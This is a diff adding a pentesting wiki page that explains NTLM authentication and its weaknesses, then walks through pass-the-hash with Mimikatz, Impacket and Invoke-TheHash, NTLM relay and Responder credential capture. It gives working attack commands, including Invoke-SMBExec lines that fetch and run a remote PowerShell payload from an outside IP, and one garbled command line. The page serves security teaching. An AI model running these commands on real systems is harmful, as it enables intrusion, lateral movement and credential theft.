@@ -1,0 +1,90 @@
+<h1 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h1><h2 id="Basic-Information"><a href="#Basic-Information" class="headerlink" title="Basic Information"></a>Basic Information</h2><p><strong>NTLM Credentials</strong>: Domain name (if any), username and password hash.</p>
+<p><strong>LM</strong> is only <strong>enabled</strong> in <strong>Windows XP and server 2003</strong> (LM hashes can be cracked). The LM hash AAD3B435B51404EEAAD3B435B51404EE means that LM is not being used (is the LM hash of empty string).</p>
+<p>By default <strong>Kerberos</strong> is <strong>used</strong>, so NTLM will only be used if <strong>there isn’t any Active Directory configured,</strong> the <strong>Domain doesn’t exist</strong>, <strong>Kerberos isn’t working</strong> (bad configuration) or the <strong>client</strong> that tries to connect using the IP instead of a valid host-name.</p>
+<p>The <strong>network packets</strong> of a <strong>NTLM authentication</strong> have the <strong>header</strong> “<strong>NTLMSSP</strong>“.</p>
+<p>The protocols: LM, NTLMv1 and NTLMv2 are supported in the DLL %windir%\Windows\System32\msv1_0.dll</p>
+<h2 id="LM-NTLMv1-and-NTLMv2"><a href="#LM-NTLMv1-and-NTLMv2" class="headerlink" title="LM, NTLMv1 and NTLMv2"></a>LM, NTLMv1 and NTLMv2</h2><p>You can check and configure which protocol will be used:</p>
+<h3 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h3><p>Execute <em>secpol.msc</em> -&gt; Local policies -&gt; Security Options -&gt; Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).</p>
+<p><img src="../../.gitbook/assets/image%20(75).png"></p>
+<h3 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h3><p>This will set the level 5:</p>
+<pre><code class="text">reg add HKLM\SYSTEM\CurrentControlSet\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
+</code></pre>
+<h2 id="Basic-NTLM-Domain-authentication-Scheme"><a href="#Basic-NTLM-Domain-authentication-Scheme" class="headerlink" title="Basic NTLM Domain authentication Scheme"></a>Basic NTLM Domain authentication Scheme</h2><ol>
+<li>The <strong>user</strong> introduces his <strong>credentials</strong></li>
+<li>The client machine <strong>sends an authentication request</strong> sending the <strong>domain name</strong> and the <strong>username</strong></li>
+<li>The <strong>server</strong> sends the <strong>challenge</strong></li>
+<li>The <strong>client encrypts</strong> the <strong>challenge</strong> using the hash of the password as key and sends it as response</li>
+<li>The <strong>server sends</strong> to the <strong>Domain controller</strong> the <strong>domain name, the username, the challenge and the response</strong>. If there <strong>isn’t</strong> an Active Directory configured or the domain name is the name of the server, the credentials are <strong>checked locally</strong>.</li>
+<li>The <strong>domain controller checks if everything is correct</strong> and sends the information to the server</li>
+</ol>
+<p>The <strong>server</strong> and the <strong>Domain Controller</strong> are able to create a <strong>Secure Channel</strong> via <strong>Netlogon</strong> server as the Domain Controller know the password of the server (it is inside the <strong>NTDS.DIT</strong> db).</p>
+<h3 id="Local-NTLM-authentication-Scheme"><a href="#Local-NTLM-authentication-Scheme" class="headerlink" title="Local NTLM authentication Scheme"></a>Local NTLM authentication Scheme</h3><p>The authentication is as the one mentioned <strong>before but</strong> the <strong>server</strong> knows the <strong>hash of the user</strong> that tries to authenticate inside the <strong>SAM</strong> file. So, instead of asking the Domain Controller, the <strong>server will check itself</strong> if the user can authenticate.</p>
+<h3 id="NTLMv1-Challenge"><a href="#NTLMv1-Challenge" class="headerlink" title="NTLMv1 Challenge"></a>NTLMv1 Challenge</h3><p>The <strong>challenge length is 8 bytes</strong> and the <strong>response is 24 bytes</strong> long.</p>
+<p>The <strong>hash NT (16bytes)</strong> is divided in <strong>3 parts of 7bytes each</strong> (7B + 7B + (2B+0x00*5)): the <strong>last part is filled with zeros</strong>. Then, the <strong>challenge</strong> is <strong>ciphered separately</strong> with each part and the <strong>resulting</strong> ciphered bytes are <strong>joined</strong>. Total: 8B + 8B + 8B = 24Bytes.</p>
+<p><strong>Problems</strong>:</p>
+<ul>
+<li>Lack of <strong>randomness</strong></li>
+<li>The 3 parts can be <strong>attacked separately</strong> to find the NT hash</li>
+<li><strong>DES is crackable</strong></li>
+<li>The 3º key is composed always by <strong>5 zeros</strong>.</li>
+<li>Given the <strong>same challenge</strong> the <strong>response</strong> will be <strong>same</strong>. So, you can give as a <strong>challenge</strong> to the victim the string “<strong>1122334455667788</strong>“ and attack the response used <strong>precomputed rainbow tables</strong>.</li>
+</ul>
+<h3 id="NTLMv2-Challenge"><a href="#NTLMv2-Challenge" class="headerlink" title="NTLMv2 Challenge"></a>NTLMv2 Challenge</h3><p>The <strong>challenge length is 8 bytes</strong> and <strong>2 responses are sent</strong>: One is <strong>24 bytes</strong> long and the length of the <strong>other</strong> is <strong>variable</strong>.</p>
+<p><strong>The first response</strong> is created by ciphering using <strong>HMAC_MD5</strong> the <strong>string</strong> composed by the <strong>client and the domain</strong> and using as <strong>key</strong> the <strong>hash MD4</strong> of the <strong>NT hash</strong>. Then, the <strong>result</strong> will by used as <strong>key</strong> to cipher using <strong>HMAC_MD5</strong> the <strong>challenge</strong>. To this, <strong>a client challenge of 8 bytes will be added</strong>. Total: 24 B.</p>
+<p>The <strong>second response</strong> is created using <strong>several values</strong> (a new client challenge, a <strong>timestamp</strong> to avoid <strong>replay attacks</strong>…)</p>
+<h2 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass-the-Hash"></a>Pass-the-Hash</h2><p><strong>Once you have the hash of the victim</strong>, you can use it to <strong>impersonate</strong> it.<br>You need to use a <strong>tool</strong> that will <strong>perform</strong> the <strong>NTLM authentication using</strong> that <strong>hash</strong>, <strong>or</strong> you could create a new <strong>sessionlogon</strong> and <strong>inject</strong> that <strong>hash</strong> inside the <strong>LSASS</strong>, so when any <strong>NTLM authentication is performed</strong>, that <strong>hash will be used.</strong> The last option is what mimikatz does.</p>
+<p><strong>Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.</strong></p>
+<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><strong>Mimikatz</strong></h3><p><strong>Needs to be run as administrator</strong></p>
+<pre><code class="bash">Invoke-Mimikatz -Command &#39;&quot;sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe&quot;&#39; 
+</code></pre>
+<p>This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the <code>runas /netonly</code> trick but you don’t need to know the plain-text password).</p>
+<h3 id="Pass-the-Hash-from-linux"><a href="#Pass-the-Hash-from-linux" class="headerlink" title="Pass-the-Hash from linux"></a>Pass-the-Hash from linux</h3><p>You can obtain code execution in Windows machines using Pass-the-Hash from Linux.<br><a href="../../pentesting/pentesting-smb.md#execute"><strong>Access here to learn how to do it.</strong></a>****</p>
+<h3 id="Impacket-Windows-compiled-tools"><a href="#Impacket-Windows-compiled-tools" class="headerlink" title="Impacket Windows compiled tools"></a>Impacket Windows compiled tools</h3><p>You can download<a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries" target="_blank" rel="noopener"> impacket binaries for Windows here</a>.</p>
+<ul>
+<li><strong>psexec_windows.exe</strong> <code>C:\AD\MyTools\psexec_windows.exe -hashes &quot;:b38ff50264b74508085d82c69794a4d8&quot; svcadmin@dcorp-mgmt.my.domain.local</code></li>
+<li><strong>wmiexec.exe</strong> <code>wmiexec_windows.exe -hashes &quot;:b38ff50264b74508085d82c69794a4d8&quot; svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local</code></li>
+<li><strong>atexec.exe</strong> (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)<code>C:\AD\MyTools\atexec_windows.exe -hashes &quot;:b38ff50264b74508085d82c69794a4d8&quot; svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local &#39;whoami&#39;</code></li>
+<li>There are several more Impacket binaries…</li>
+</ul>
+<h3 id="Invoke-TheHash"><a href="#Invoke-TheHash" class="headerlink" title="Invoke-TheHash"></a>Invoke-TheHash</h3><p>You can get the powershell scripts from here: <a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
+<h4 id="Invoke-SMBExec"><a href="#Invoke-SMBExec" class="headerlink" title="Invoke-SMBExec"></a>Invoke-SMBExec</h4><pre><code class="text">Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command &#39;powershell -ep bypass -Command &quot;iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)&quot;&#39; -verbose
+</code></pre>
+<h4 id="Invoke-WMIExec"><a href="#Invoke-WMIExec" class="headerlink" title="Invoke-WMIExec"></a>Invoke-WMIExec</h4><pre><code class="text">Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command &#39;powershell -ep bypass -Command &quot;iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)&quot;&#39; -verbose
+</code></pre>
+<h4 id="Invoke-SMBClient"><a href="#Invoke-SMBClient" class="headerlink" title="Invoke-SMBClient"></a>Invoke-SMBClient</h4><pre><code class="text">Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
+</code></pre>
+<h4 id="Invoke-SMBEnum"><a href="#Invoke-SMBEnum" class="headerlink" title="Invoke-SMBEnum"></a>Invoke-SMBEnum</h4><pre><code class="text">Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
+</code></pre>
+<h4 id="Invoke-TheHash-1"><a href="#Invoke-TheHash-1" class="headerlink" title="Invoke-TheHash"></a>Invoke-TheHash</h4><p>This function is a <strong>mix of all the others</strong>. You can pass <strong>several hosts</strong>, <strong>exclude</strong> someones and <strong>select</strong> the <strong>option</strong> you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select <strong>any</strong> of <strong>SMBExec</strong> and <strong>WMIExec</strong> but you <strong>don’t</strong> give any _<strong>Command</strong>_ parameter it will just <strong>check</strong> if you have <strong>enough permissions</strong>.</p>
+<pre><code class="text">Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
+</code></pre>
+<h3 id="Evil-WinRM-Pass-the-Hash"><a href="#Evil-WinRM-Pass-the-Hash" class="headerlink" title="Evil-WinRM Pass the Hash"></a><a href="../../pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm">Evil-WinRM Pass the Hash</a></h3><h3 id="Windows-Credentials-Editor-WCE"><a href="#Windows-Credentials-Editor-WCE" class="headerlink" title="Windows Credentials Editor (WCE)"></a>Windows Credentials Editor (WCE)</h3><p><strong>Needs to be run as administrator</strong></p>
+<p>This tool will do the same thing as mimikatz (modify LSASS memory).</p>
+<pre><code class="text">wce.exe -s &lt;username&gt;:&lt;domain&gt;:&lt;hash_lm&gt;:&lt;hash_nt&gt;
+</code></pre>
+<h3 id="Manual-Windows-remote-execution-with-username-and-password"><a href="#Manual-Windows-remote-execution-with-username-and-password" class="headerlink" title="Manual Windows remote execution with username and password"></a>Manual Windows remote execution with username and password</h3><ul>
+<li>****<a href="psexec-and-winexec.md"><strong>PsExec</strong></a>****</li>
+<li><a href="smbexec.md"><strong>SmbExec</strong></a>****</li>
+<li>****<a href="wmicexec.md"><strong>WmicExec</strong></a>****</li>
+<li>****<a href="atexec.md"><strong>AtExec</strong></a>****</li>
+</ul>
+<h2 id="Extracting-credentials-from-a-Windows-Host"><a href="#Extracting-credentials-from-a-Windows-Host" class="headerlink" title="Extracting credentials from a Windows Host"></a>Extracting credentials from a Windows Host</h2><p><strong>For more information about</strong> <a href="../stealing-credentials/"><strong>how to obtain credentials from a Windows host you should read this page</strong></a><strong>.</strong></p>
+<h2 id="More-about-NTLM-Relay-and-Responder"><a href="#More-about-NTLM-Relay-and-Responder" class="headerlink" title="More about NTLM Relay and Responder"></a>More about NTLM Relay and Responder</h2><p><strong>Read</strong> <a href="../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md"><strong>here a more detailed guide</strong></a> <strong>on howto perform those attacks</strong></p>
+<h2 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a>NTLM relay</h2><p>Because of how the NTLM authentication behaves, if you could make a <strong>client to authenticate against you</strong>, you could <strong>use its credentials to access another machine</strong>. This will work by sending the <strong>same challenge</strong> that the <strong>server sends to you to the victim</strong>, and send the <strong>response of the challenge of the victim to the server</strong>. You won’t even need to crack the challenge response of the victim because you will use it to connect to another machine.</p>
+<p>You can perform this attack using <strong>metasploit module</strong>: <code>exploit/windows/smb/smb_relay</code></p>
+<p>The  option <code>SRVHOST</code> is used to point the server <strong>were you want to get access</strong>.<br>Then, when <strong>any host try to authenticate against you</strong>, metasploit will <strong>try to authenticate against the other</strong> server.</p>
+<p>You <strong>can’t authenticate against the same host that is trying to authenticate against you</strong> (MS08-068). <strong>Metasploit</strong> will <strong>always</strong> send a “_<strong>Denied</strong>_” <strong>response</strong> to the <strong>client</strong> that is trying to connect to you.</p>
+<p>You can also perform this attack using the <strong>impacket tool</strong>: <em><strong>smbrelayx.py</strong></em></p>
+<pre><code class="text">smbrelayx.py .h &lt;HOST_to_attack&gt; [-c &lt;Command_to_exec&gt;] [-e &lt;path_to_binary_to_exec&gt;]
+</code></pre>
+<p>This <strong>attack can be easily solved implementing SMB</strong> <em><strong>Signing</strong></em> (by default only Windows servers implements that option).</p>
+<p>Read: <a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</a></p>
+<h2 id="Getting-Credentials-with-Responder"><a href="#Getting-Credentials-with-Responder" class="headerlink" title="Getting Credentials with Responder"></a>Getting Credentials with Responder</h2><p>Responder will create a lot of services that can <strong>capture credentials when someone try to access them</strong>. It can also send <strong>fake DNS responses</strong> (so the IP of the attacker is resolved) and can inject <strong>PAC files</strong> so the victim will get the IP of the <strong>attacker as a proxy</strong>.</p>
+<pre><code class="text">responder.py -I &lt;interface&gt; -w On #If the computer detects the LAN configuration automatically, this will impersonate it
+</code></pre>
+<p>You can also <strong>resolve NetBIOS</strong> requests with <strong>your IP</strong>. And create an <strong>authentication proxy</strong>:</p>
+<pre><code class="text">responder.py -I &lt;interface&gt; -rPv
+</code></pre>
+<p>You won’t be able to intercept NTLM hashes (normally), but you can easly grab some <strong>NTLM challenges and responses</strong> that you can <strong>crack</strong> using for example <em><strong>john</strong></em> option <code>--format=netntlmv2</code>.</p>
+<p>The <strong>logs and the challenges</strong> of default <em><strong>Responder</strong></em> installation in kali can be found in <code>/usr/share/responder/logs</code></p>
+<h2 id="Parse-NTLM-challenges-from-a-network-capture"><a href="#Parse-NTLM-challenges-from-a-network-capture" class="headerlink" title="Parse NTLM challenges from a network capture"></a>Parse NTLM challenges from a network capture</h2><p><strong>You can use</strong> <a href="https://github.com/mlgualtieri/NTLMRawUnHide" target="_blank" rel="noopener"><strong>https://github.com/mlgualtieri/NTLMRawUnHide</strong></a>****</p>
